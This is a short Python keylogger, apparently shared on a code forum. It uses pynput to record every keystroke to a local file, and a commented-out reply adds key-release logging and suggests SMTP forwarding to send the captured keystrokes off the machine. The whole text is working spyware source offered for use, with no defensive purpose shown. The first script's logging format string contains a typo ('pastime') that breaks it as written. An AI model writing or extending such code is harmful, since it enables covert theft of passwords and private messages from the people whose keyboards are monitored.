from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format=" %(pastime)s - %(message)s")


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
  
#Awesome work done

#I added a release mechanism to release resources based on your code segment ..... have you considered using hooks for smtp forwarding?:

#import logging
#from pynput import keyboard

#logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

#def on_press(key):
 #   logging.info(key)

#def on_release(key):
 #   logging.info(key)

#with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
 #   listener.join()
